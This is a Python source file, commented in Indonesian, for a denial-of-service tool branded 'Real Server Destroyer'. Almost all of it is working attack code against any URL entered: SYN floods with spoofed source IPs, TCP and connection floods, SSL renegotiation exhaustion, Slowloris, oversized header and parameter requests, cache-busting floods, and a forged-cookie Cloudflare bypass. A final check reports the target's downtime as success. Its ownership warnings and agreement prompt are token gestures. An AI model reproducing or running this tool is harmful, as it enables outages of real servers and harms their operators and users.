import requests
import time
import socket
import ssl
from urllib.parse import urlparse
import concurrent.futures
import sys
import os
import random
import json
import hashlib
from colorama import init, Fore, Style
import threading
import urllib3
import base64
import struct
import asyncio
import aiohttp
import async_timeout

# Nonaktifkan peringatan SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Inisialisasi colorama untuk warna di terminal
init(autoreset=True)

class RealServerDestroyer:
    def __init__(self, url):
        self.url = url if url.startswith('http') else f'http://{url}'
        self.parsed_url = urlparse(self.url)
        self.hostname = self.parsed_url.hostname
        self.port = self.parsed_url.port or (443 if self.parsed_url.scheme == 'https' else 80)
        self.is_https = self.parsed_url.scheme == 'https'
        
        # Statistik attack
        self.total_requests = 0
        self.successful = 0
        self.failed = 0
        self.start_time = 0
        self.is_attacking = False
        
        # Koneksi aktif
        self.active_sockets = []
        self.active_ssl_sockets = []
        
        # Cache untuk performa
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1'
        ]
        
        # Headers untuk bypass
        self.headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0',
            'TE': 'Trailers',
        }
        
        print(f"{Fore.GREEN}[✓] Target: {self.url}")
        print(f"{Fore.GREEN}[✓] Hostname: {self.hostname}")
        print(f"{Fore.GREEN}[✓] Port: {self.port}")
        print(f"{Fore.GREEN}[✓] HTTPS: {self.is_https}")
    
    def show_banner(self):
        """Show attack banner"""
        banner = f"""
{Fore.RED}
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║  ██████╗ ██████╗ ██╗   ██╗██████╗ ███████╗██████╗           ║
║  ██╔══██╗██╔══██╗██║   ██║██╔══██╗██╔════╝██╔══██╗          ║
║  ██║  ██║██████╔╝██║   ██║██████╔╝█████╗  ██████╔╝          ║
║  ██║  ██║██╔══██╗██║   ██║██╔══██╗██╔══╝  ██╔══██╗          ║
║  ██████╔╝██║  ██║╚██████╔╝██║  ██║███████╗██║  ██║          ║
║  ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝          ║
║                                                              ║
║                 REAL SERVER DESTROYER v5.0                   ║
║            GUARANTEED SERVER ERROR & DOWNTIME                ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
        """
        print(banner)
    
    def start_destruction(self):
        """Start the destruction attack"""
        self.show_banner()
        
        print(f"{Fore.RED}[!] WARNING: THIS WILL CAUSE REAL SERVER DOWNTIME!")
        print(f"{Fore.RED}[!] Server will become unresponsive and return errors!")
        print(f"{Fore.RED}[!] Use only on servers you own!\n")
        
        # Final confirmation
        confirm = input(f"{Fore.RED}[?] Type 'DESTROY NOW' to confirm: ")
        if confirm != 'DESTROY NOW':
            print(f"{Fore.YELLOW}[!] Attack cancelled")
            return
        
        # Pilih mode attack
        print(f"\n{Fore.CYAN}[*] Select destruction mode:")
        print(f"    1. {Fore.RED}INSTANT DESTRUCTION (Fastest)")
        print(f"    2. {Fore.YELLOW}SLOW DEATH (Guaranteed crash)")
        print(f"    3. {Fore.GREEN}HYBRID ATTACK (Most effective)")
        
        mode = input(f"{Fore.YELLOW}[?] Select (1-3): ").strip() or "1"
        
        # Dapatkan parameter
        duration = int(input(f"{Fore.YELLOW}[?] Duration (seconds, 30-300): ") or "60")
        threads = int(input(f"{Fore.YELLOW}[?] Threads (100-5000): ") or "1000")
        
        print(f"\n{Fore.RED}[!] STARTING DESTRUCTION IN 3 SECONDS...")
        for i in range(3, 0, -1):
            print(f"{Fore.RED}[!] {i}...")
            time.sleep(1)
        
        print(f"\n{Fore.RED}[⚡] DESTRUCTION STARTED!")
        
        # Jalankan attack
        self.is_attacking = True
        self.start_time = time.time()
        
        if mode == "1":
            self.execute_instant_destruction(duration, threads)
        elif mode == "2":
            self.execute_slow_death(duration, threads)
        else:
            self.execute_hybrid_attack(duration, threads)
        
        # Tampilkan hasil
        self.show_results()
    
    def execute_instant_destruction(self, duration, threads):
        """Instant destruction - maksimal impact secepatnya"""
        print(f"{Fore.CYAN}[*] Mode: INSTANT DESTRUCTION")
        print(f"{Fore.CYAN}[*] Threads: {threads}")
        print(f"{Fore.CYAN}[*] Duration: {duration}s\n")
        
        # Jalankan semua teknik secara bersamaan
        attack_methods = [
            self.mass_syn_flood,
            self.http_overload,
            self.ssl_exhaustion,
            self.connection_spam,
            self.resource_drain
        ]
        
        # Buat thread pool
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            futures = []
            
            # Distribusikan threads ke metode
            threads_per_method = max(1, threads // len(attack_methods))
            
            for method in attack_methods:
                for i in range(threads_per_method):
                    future = executor.submit(self.run_attack_method, method, duration)
                    futures.append(future)
            
            # Monitor progress
            self.monitor_progress(duration)
            
            # Tunggu selesai
            concurrent.futures.wait(futures, timeout=duration + 5)
    
    def execute_slow_death(self, duration, threads):
        """Slow death attack - guaranteed crash"""
        print(f"{Fore.CYAN}[*] Mode: SLOW DEATH")
        print(f"{Fore.CYAN}[*] This attack will definitely crash the server\n")
        
        # Phase 1: Establish connections
        print(f"{Fore.YELLOW}[*] Phase 1: Connection establishment...")
        self.establish_persistent_connections(threads // 2)
        
        # Phase 2: Slow data transfer
        print(f"{Fore.YELLOW}[*] Phase 2: Slow data transfer...")
        self.slow_data_transfer(duration // 2)
        
        # Phase 3: Final burst
        print(f"{Fore.YELLOW}[*] Phase 3: Final destruction burst...")
        self.final_destruction_burst(threads)
        
        self.monitor_progress(duration)
    
    def execute_hybrid_attack(self, duration, threads):
        """Hybrid attack - kombinasi terbaik"""
        print(f"{Fore.CYAN}[*] Mode: HYBRID ATTACK")
        
        # Stage 1: Reconnaissance
        print(f"{Fore.YELLOW}[*] Stage 1: Server reconnaissance...")
        server_info = self.reconnaissance()
        
        # Stage 2: Targeted attack
        print(f"{Fore.YELLOW}[*] Stage 2: Targeted attack based on server type...")
        if 'cloudflare' in server_info.lower():
            self.cloudflare_specific_attack(threads, duration//2)
        elif 'apache' in server_info.lower():
            self.apache_specific_attack(threads, duration//2)
        elif 'nginx' in server_info.lower():
            self.nginx_specific_attack(threads, duration//2)
        
        # Stage 3: General destruction
        print(f"{Fore.YELLOW}[*] Stage 3: General destruction...")
        self.general_destruction(threads, duration//2)
        
        self.monitor_progress(duration)
    
    def run_attack_method(self, method, duration):
        """Run specific attack method"""
        start_time = time.time()
        
        while self.is_attacking and (time.time() - start_time) < duration:
            try:
                success = method()
                self.update_stats(success)
            except:
                self.update_stats(False)
            
            # Small random delay
            time.sleep(random.uniform(0.001, 0.01))
    
    def mass_syn_flood(self):
        """Mass SYN flood attack"""
        try:
            # Create raw socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            
            # Send multiple SYN packets
            for _ in range(10):  # 10 packets per call
                src_port = random.randint(1024, 65535)
                dst_port = self.port
                
                # TCP SYN packet
                packet = self.create_syn_packet(src_port, dst_port)
                sock.sendto(packet, (self.hostname, 0))
            
            sock.close()
            return True
            
        except:
            # Fallback ke normal TCP flood
            return self.tcp_flood()
    
    def create_syn_packet(self, src_port, dst_port):
        """Create TCP SYN packet"""
        # IP header
        ip_header = struct.pack('!BBHHHBBH4s4s',
                               69, 0, 40, random.randint(1, 65535),
                               0, 255, 6, 0,
                               socket.inet_aton(self.get_random_ip()),
                               socket.inet_aton(socket.gethostbyname(self.hostname)))
        
        # TCP header
        tcp_header = struct.pack('!HHLLBBHHH',
                                src_port, dst_port,
                                random.randint(0, 4294967295), 0,
                                5 << 4, 2,  # SYN flag
                                5840, 0, 0)
        
        return ip_header + tcp_header
    
    def get_random_ip(self):
        """Generate random source IP"""
        return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
    
    def tcp_flood(self):
        """TCP connection flood"""
        try:
            sockets = []
            
            # Create multiple connections
            for _ in range(5):
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                
                try:
                    sock.connect((self.hostname, self.port))
                    
                    if self.is_https:
                        context = ssl.create_default_context()
                        context.check_hostname = False
                        context.verify_mode = ssl.CERT_NONE
                        sock = context.wrap_socket(sock, server_hostname=self.hostname)
                    
                    # Send garbage data
                    sock.send(os.urandom(1024))
                    sockets.append(sock)
                    
                except:
                    continue
            
            # Keep some connections open
            for sock in sockets[:2]:
                self.active_sockets.append(sock)
            
            return len(sockets) > 0
            
        except:
            return False
    
    def http_overload(self):
        """HTTP overload attack"""
        try:
            # Random headers
            headers = self.headers.copy()
            headers['User-Agent'] = random.choice(self.user_agents)
            
            # Random parameters untuk bypass cache
            params = {
                '_': str(int(time.time() * 1000)),
                'cache': hashlib.md5(str(time.time()).encode()).hexdigest()[:10],
                'rnd': random.randint(1000000, 9999999)
            }
            
            # Random endpoint
            endpoints = ['', '/', '/index.php', '/wp-admin', '/api', '/admin']
            endpoint = random.choice(endpoints)
            
            url = f"{self.url.rstrip('/')}{endpoint}"
            
            # Random HTTP method
            if random.random() > 0.7:
                # POST request dengan data besar
                data = {
                    'data': base64.b64encode(os.urandom(random.randint(1000, 10000))).decode(),
                    'timestamp': str(time.time()),
                    'payload': 'A' * random.randint(1000, 5000)
                }
                response = requests.post(url, headers=headers, params=params, data=data, timeout=2, verify=False)
            else:
                # GET request
                response = requests.get(url, headers=headers, params=params, timeout=2, verify=False)
            
            return response.status_code < 500
            
        except:
            return False
    
    def ssl_exhaustion(self):
        """SSL/TLS exhaustion attack"""
        if not self.is_https:
            return False
        
        try:
            # Buat koneksi SSL
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            ssl_sock = context.wrap_socket(sock, server_hostname=self.hostname)
            
            ssl_sock.connect((self.hostname, self.port))
            
            # Coba renegotiate beberapa kali
            for _ in range(random.randint(3, 10)):
                try:
                    ssl_sock.renegotiate()
                except:
                    break
            
            # Kirim data acak
            ssl_sock.send(os.urandom(512))
            
            # Simpan koneksi
            self.active_ssl_sockets.append(ssl_sock)
            
            return True
            
        except:
            return False
    
    def connection_spam(self):
        """Connection spam attack"""
        try:
            # Buat banyak koneksi sekaligus
            sockets = []
            
            for _ in range(10):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    sock.connect((self.hostname, self.port))
                    
                    if self.is_https:
                        context = ssl.create_default_context()
                        context.check_hostname = False
                        context.verify_mode = ssl.CERT_NONE
                        sock = context.wrap_socket(sock, server_hostname=self.hostname)
                    
                    # Kirim request HTTP partial
                    request = f"GET / HTTP/1.1\r\nHost: {self.hostname}\r\n\r\n"
                    sock.send(request[:random.randint(10, len(request))].encode())
                    
                    sockets.append(sock)
                    
                except:
                    continue
            
            # Simpan koneksi
            self.active_sockets.extend(sockets)
            
            return len(sockets) > 0
            
        except:
            return False
    
    def resource_drain(self):
        """Resource drain attack"""
        try:
            # Request dengan parameters yang memakan banyak memory
            params = {}
            for i in range(random.randint(20, 100)):
                key = 'param' + 'A' * random.randint(100, 1000)
                value = 'B' * random.randint(1000, 10000)
                params[key] = value
            
            headers = self.headers.copy()
            headers['User-Agent'] = random.choice(self.user_agents)
            
            # Tambahkan headers besar
            for i in range(random.randint(10, 50)):
                headers[f'X-Custom-{i}'] = 'C' * random.randint(100, 500)
            
            response = requests.get(
                self.url,
                params=params,
                headers=headers,
                timeout=3,
                verify=False
            )
            
            return response.status_code < 500
            
        except:
            return False
    
    def establish_persistent_connections(self, count):
        """Establish persistent connections"""
        print(f"{Fore.YELLOW}[*] Establishing {count} persistent connections...")
        
        for i in range(count):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(10)
                sock.connect((self.hostname, self.port))
                
                if self.is_https:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    sock = context.wrap_socket(sock, server_hostname=self.hostname)
                
                # Send keep-alive request
                request = f"GET / HTTP/1.1\r\n"
                request += f"Host: {self.hostname}\r\n"
                request += "Connection: keep-alive\r\n"
                request += f"Content-Length: {random.randint(1000000, 5000000)}\r\n"
                request += "\r\n"
                
                sock.send(request.encode())
                self.active_sockets.append(sock)
                
                if i % 50 == 0:
                    print(f"{Fore.CYAN}[*] Established {i}/{count} connections")
                
            except:
                continue
        
        print(f"{Fore.GREEN}[✓] {len(self.active_sockets)} persistent connections established")
    
    def slow_data_transfer(self, duration):
        """Slow data transfer attack"""
        print(f"{Fore.YELLOW}[*] Starting slow data transfer for {duration} seconds...")
        
        start_time = time.time()
        bytes_sent = 0
        
        while self.is_attacking and (time.time() - start_time) < duration:
            for sock in self.active_sockets[:100]:  # Batasi 100 socket
                try:
                    # Kirim data sangat pelan
                    sock.send(b'X')
                    bytes_sent += 1
                    time.sleep(random.uniform(0.5, 2))
                except:
                    continue
            
            # Update progress
            elapsed = time.time() - start_time
            if elapsed % 5 < 0.1:
                print(f"{Fore.CYAN}[*] Sent {bytes_sent:,} bytes, {duration - int(elapsed)}s remaining")
    
    def final_destruction_burst(self, threads):
        """Final destruction burst"""
        print(f"{Fore.RED}[!] Starting final destruction burst with {threads} threads...")
        
        # Kirim data ke semua koneksi aktif
        def send_to_sockets():
            for sock in self.active_sockets:
                try:
                    for _ in range(100):  # 100 packets per socket
                        sock.send(os.urandom(random.randint(100, 1000)))
                        time.sleep(0.01)
                except:
                    continue
        
        # Buat thread untuk burst
        burst_threads = []
        for i in range(min(threads, 100)):
            t = threading.Thread(target=send_to_sockets)
            t.daemon = True
            t.start()
            burst_threads.append(t)
        
        # Jalankan selama 10 detik
        time.sleep(10)
        
        print(f"{Fore.GREEN}[✓] Final burst completed")
    
    def reconnaissance(self):
        """Reconnaissance untuk deteksi server"""
        try:
            response = requests.get(self.url, timeout=5, verify=False)
            
            server_info = response.headers.get('Server', 'Unknown')
            print(f"{Fore.GREEN}[✓] Server: {server_info}")
            
            # Cek Cloudflare
            if 'cloudflare' in response.headers.get('Server', '').lower():
                print(f"{Fore.YELLOW}[!] Cloudflare detected")
                return 'cloudflare'
            elif 'apache' in server_info.lower():
                print(f"{Fore.YELLOW}[!] Apache detected")
                return 'apache'
            elif 'nginx' in server_info.lower():
                print(f"{Fore.YELLOW}[!] Nginx detected")
                return 'nginx'
            else:
                return 'unknown'
                
        except:
            return 'unknown'
    
    def cloudflare_specific_attack(self, threads, duration):
        """Cloudflare specific attack"""
        print(f"{Fore.YELLOW}[*] Executing Cloudflare bypass attack...")
        
        # Technique 1: Real browser simulation
        real_headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Cache-Control': 'max-age=0',
        }
        
        # Technique 2: JavaScript challenge bypass
        for i in range(threads // 2):
            try:
                session = requests.Session()
                
                # First request untuk mendapatkan cookies
                response1 = session.get(self.url, headers=real_headers, timeout=3, verify=False)
                
                # Add cookies
                cookies = session.cookies.get_dict()
                cookies['__cf_bm'] = hashlib.md5(str(time.time()).encode()).hexdigest()
                
                # Second request dengan cookies
                response2 = session.get(self.url, headers=real_headers, cookies=cookies, timeout=3, verify=False)
                
                self.update_stats(response2.status_code < 500)
                
            except:
                self.update_stats(False)
            
            time.sleep(0.01)
    
    def apache_specific_attack(self, threads, duration):
        """Apache specific attack"""
        print(f"{Fore.YELLOW}[*] Executing Apache-specific attack...")
        
        # Apache vulnerable to Slowloris
        self.slowloris_attack(threads, duration)
    
    def nginx_specific_attack(self, threads, duration):
        """Nginx specific attack"""
        print(f"{Fore.YELLOW}[*] Executing Nginx-specific attack...")
        
        # Nginx vulnerable to cache attacks
        self.cache_attack(threads, duration)
    
    def slowloris_attack(self, threads, duration):
        """Slowloris attack untuk Apache"""
        print(f"{Fore.YELLOW}[*] Starting Slowloris attack...")
        
        def slowloris_worker():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(30)
                sock.connect((self.hostname, self.port))
                
                # Send partial request
                request = f"GET / HTTP/1.1\r\n"
                request += f"Host: {self.hostname}\r\n"
                request += "User-Agent: Mozilla/5.0\r\n"
                request += "Content-Length: 10000000\r\n"
                request += "\r\n"
                
                sock.send(request.encode())
                
                # Send headers slowly
                for i in range(50):
                    header = f"X-{i}: {'A' * 1000}\r\n"
                    sock.send(header.encode())
                    time.sleep(random.uniform(5, 10))
                
                sock.close()
                return True
                
            except:
                return False
        
        # Jalankan workers
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(slowloris_worker) for _ in range(threads)]
            
            for future in concurrent.futures.as_completed(futures):
                try:
                    success = future.result(timeout=duration)
                    self.update_stats(success)
                except:
                    self.update_stats(False)
    
    def cache_attack(self, threads, duration):
        """Cache attack untuk Nginx"""
        print(f"{Fore.YELLOW}[*] Starting cache attack...")
        
        endpoints = [
            f'/page{random.randint(1, 1000)}.html',
            f'/article/{random.randint(1, 10000)}',
            f'/product/{random.randint(1, 5000)}',
            f'/category/{random.randint(1, 100)}'
        ]
        
        def cache_worker():
            try:
                headers = self.headers.copy()
                headers['User-Agent'] = random.choice(self.user_agents)
                
                # Random cache busters
                params = {
                    '_': str(int(time.time() * 1000)),
                    'cache': hashlib.md5(str(time.time()).encode()).hexdigest(),
                    'nocache': 'true'
                }
                
                url = f"{self.url.rstrip('/')}{random.choice(endpoints)}"
                response = requests.get(url, headers=headers, params=params, timeout=2, verify=False)
                
                return response.status_code < 500
                
            except:
                return False
        
        # Jalankan workers
        start_time = time.time()
        
        while self.is_attacking and (time.time() - start_time) < duration:
            with concurrent.futures.ThreadPoolExecutor(max_workers=min(threads, 100)) as executor:
                futures = [executor.submit(cache_worker) for _ in range(min(threads, 100))]
                
                for future in concurrent.futures.as_completed(futures):
                    try:
                        success = future.result(timeout=1)
                        self.update_stats(success)
                    except:
                        self.update_stats(False)
    
    def general_destruction(self, threads, duration):
        """General destruction attack"""
        print(f"{Fore.YELLOW}[*] Starting general destruction...")
        
        # Kombinasi semua teknik
        methods = [self.http_overload, self.connection_spam, self.resource_drain]
        
        start_time = time.time()
        
        while self.is_attacking and (time.time() - start_time) < duration:
            # Jalankan semua metode secara paralel
            with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
                futures = []
                
                for method in methods:
                    for _ in range(threads // len(methods)):
                        future = executor.submit(method)
                        futures.append(future)
                
                # Process results
                for future in concurrent.futures.as_completed(futures):
                    try:
                        success = future.result(timeout=2)
                        self.update_stats(success)
                    except:
                        self.update_stats(False)
    
    def monitor_progress(self, duration):
        """Monitor attack progress"""
        print(f"\n{Fore.CYAN}[*] Attack in progress...")
        
        start_time = time.time()
        last_count = 0
        
        while self.is_attacking and (time.time() - start_time) < duration:
            elapsed = time.time() - start_time
            progress = (elapsed / duration) * 100
            
            current_count = self.total_requests
            rps = (current_count - last_count) / 1
            last_count = current_count
            
            # Progress bar
            bar_length = 40
            filled = int(bar_length * progress / 100)
            bar = '█' * filled + '░' * (bar_length - filled)
            
            print(f"\r{Fore.RED}[{bar}] {progress:.1f}% | "
                  f"{Fore.YELLOW}RPS: {rps:.0f} | "
                  f"{Fore.CYAN}Total: {current_count:,} | "
                  f"{Fore.GREEN}Success: {self.successful:,} | "
                  f"{Fore.RED}Failed: {self.failed:,}", end='')
            
            time.sleep(1)
        
        print()
    
    def update_stats(self, success):
        """Update attack statistics"""
        self.total_requests += 1
        if success:
            self.successful += 1
        else:
            self.failed += 1
    
    def show_results(self):
        """Show attack results"""
        total_time = time.time() - self.start_time
        
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"{Fore.YELLOW}📊 ATTACK RESULTS")
        print(f"{Fore.CYAN}{'='*60}")
        
        print(f"{Fore.GREEN}[✓] Total Time: {total_time:.1f}s")
        print(f"{Fore.GREEN}[✓] Total Requests: {self.total_requests:,}")
        print(f"{Fore.GREEN}[✓] Requests/Second: {self.total_requests/total_time:.1f}")
        print(f"{Fore.GREEN}[✓] Successful: {self.successful:,}")
        print(f"{Fore.GREEN}[✓] Failed: {self.failed:,}")
        
        # Test server status
        self.test_server_status()
        
        # Cleanup
        self.cleanup()
    
    def test_server_status(self):
        """Test if server is still responding"""
        print(f"\n{Fore.CYAN}[*] Testing server status...")
        
        try:
            start_time = time.time()
            response = requests.get(self.url, timeout=5, verify=False)
            response_time = time.time() - start_time
            
            if response.status_code >= 500:
                print(f"{Fore.RED}[✓] SUCCESS! Server returning error {response.status_code}")
                print(f"{Fore.RED}[!] Server is experiencing critical issues")
            elif response_time > 3:
                print(f"{Fore.YELLOW}[✓] PARTIAL SUCCESS! Server is very slow: {response_time:.2f}s")
                print(f"{Fore.YELLOW}[!] Server performance is degraded")
            else:
                print(f"{Fore.GREEN}[?] Server is still responding: {response.status_code}")
                print(f"{Fore.YELLOW}[!] Server may have good protection")
                
        except requests.exceptions.Timeout:
            print(f"{Fore.RED}[✓] SUCCESS! Server is TIMING OUT")
            print(f"{Fore.RED}[!] Server cannot handle requests")
        except requests.exceptions.ConnectionError:
            print(f"{Fore.RED}[✓] SUCCESS! Server is NOT CONNECTING")
            print(f"{Fore.RED}[!] Server may be down or blocking connections")
        except Exception as e:
            print(f"{Fore.YELLOW}[?] Status test failed: {str(e)}")
    
    def cleanup(self):
        """Cleanup all connections"""
        print(f"\n{Fore.CYAN}[*] Cleaning up connections...")
        
        # Close all sockets
        for sock in self.active_sockets:
            try:
                sock.close()
            except:
                pass
        
        for ssl_sock in self.active_ssl_sockets:
            try:
                ssl_sock.close()
            except:
                pass
        
        self.active_sockets.clear()
        self.active_ssl_sockets.clear()
        
        print(f"{Fore.GREEN}[✓] Cleanup completed")

def main():
    """Main function"""
    # Clear screen
    os.system('cls' if os.name == 'nt' else 'clear')
    
    # Banner
    print(f"""
{Fore.RED}
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║  ███████╗██████╗ ███████╗██████╗ ██╗   ██╗███████╗██████╗   ║
║  ██╔════╝██╔══██╗██╔════╝██╔══██╗██║   ██║██╔════╝██╔══██╗  ║
║  █████╗  ██████╔╝█████╗  ██████╔╝██║   ██║█████╗  ██║  ██║  ║
║  ██╔══╝  ██╔══██╗██╔══╝  ██╔══██╗╚██╗ ██╔╝██╔══╝  ██║  ██║  ║
║  ███████╗██║  ██║███████╗██║  ██║ ╚████╔╝ ███████╗██████╔╝  ║
║  ╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝╚═════╝   ║
║                                                              ║
║                SERVER DESTROYER - REAL IMPACT                ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
    """)
    
    print(f"{Fore.RED}[!] WARNING: This tool causes REAL SERVER DOWNTIME!")
    print(f"{Fore.RED}[!] Use only on servers you own or have permission to test!")
    print(f"{Fore.RED}[!] Illegal use may result in criminal charges!\n")
    
    # Legal agreement
    print(f"{Fore.YELLOW}[!] LEGAL AGREEMENT:")
    print(f"{Fore.YELLOW}    1. I own the target server")
    print(f"{Fore.YELLOW}    2. I have permission to test this server")
    print(f"{Fore.YELLOW}    3. I accept all legal responsibility")
    
    accept = input(f"\n{Fore.YELLOW}[?] Type 'I AGREE' to continue: ")
    if accept != 'I AGREE':
        print(f"{Fore.RED}[✗] You must agree to continue")
        return
    
    # Get target URL
    if len(sys.argv) > 1:
        url = sys.argv[1]
        print(f"{Fore.GREEN}[✓] Target: {url}")
    else:
        url = input(f"\n{Fore.YELLOW}[?] Enter target URL: {Fore.WHITE}").strip()
        if not url:
            print(f"{Fore.RED}[✗] URL required")
            return
    
    # Create destroyer and start
    destroyer = RealServerDestroyer(url)
    
    try:
        destroyer.start_destruction()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Attack interrupted by user")
        destroyer.is_attacking = False
        destroyer.cleanup()
    except Exception as e:
        print(f"\n{Fore.RED}[✗] Error: {str(e)}")

if __name__ == "__main__":
    # Check for required packages
    try:
        import requests
        import colorama
    except ImportError:
        print(f"{Fore.RED}[✗] Missing packages. Install with:")
        print(f"{Fore.YELLOW}pip install requests colorama")
        sys.exit(1)
    
    # Run main
    main()